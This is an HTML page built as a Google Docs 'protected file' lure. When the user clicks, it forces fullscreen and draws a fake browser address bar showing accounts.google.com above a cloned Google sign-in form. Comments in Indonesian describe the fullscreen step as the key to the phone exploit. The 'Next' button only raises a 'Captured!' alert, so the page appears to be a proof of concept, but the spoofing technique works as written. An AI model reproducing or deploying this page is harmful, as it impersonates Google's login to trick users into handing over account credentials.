<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Document</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background: #fff; overflow: hidden; }
        /* Address Bar Palsu */
        #fake-url {
            display: none; width: 100%; height: 60px; background: #f1f3f4;
            border-bottom: 1px solid #dadce0; align-items: center; padding: 0 15px; box-sizing: border-box;
        }
        .url-text { background: white; flex-grow: 1; margin: 0 10px; padding: 8px 15px; border-radius: 20px; font-size: 14px; color: #202124; border: 1px solid #dfe1e5; }
        
        /* Tombol Pemicu */
        #trigger-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .btn { background: #1a73e8; color: white; padding: 15px 40px; border: none; border-radius: 25px; font-size: 16px; font-weight: 500; }
    </style>
</head>
<body>

    <div id="trigger-box">
        <img src="https://www.gstatic.com/images/branding/product/2x/docs_96dp.png" width="70">
        <h2 style="font-weight: 400;">Protected File</h2>
        <p style="color: #5f6368; padding: 0 40px; text-align: center;">You must be signed in to view this document.</p>
        <button id="go" class="btn">Sign in to Google</button>
    </div>

    <div id="spoof-ui" style="display: none;">
        <div id="fake-url">
            <span style="font-size: 18px;">&#128274;</span>
            <div class="url-text">accounts.google.com</div>
            <span style="font-size: 18px;">&#8942;</span>
        </div>
        <div style="padding: 40px 20px;">
            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
            <h1 style="font-size: 24px; font-weight: 400; margin-top: 20px;">Sign in</h1>
            <p>Use your Google Account</p>
            <input type="text" placeholder="Email or phone" style="width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box;">
            <button onclick="alert('Captured!')" style="width: 100%; background: #1a73e8; color: white; padding: 12px; border: none; border-radius: 4px; font-weight: 500;">Next</button>
        </div>
    </div>

    <script>
        document.getElementById('go').onclick = function() {
            // MASUK MODE FULLSCREEN (Kunci Exploit HP)
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            }

            // Tampilkan UI Palsu
            document.getElementById('trigger-box').style.display = 'none';
            document.getElementById('spoof-ui').style.display = 'block';
            document.getElementById('fake-url').style.display = 'flex';
        };
    </script>
</body>
</html>
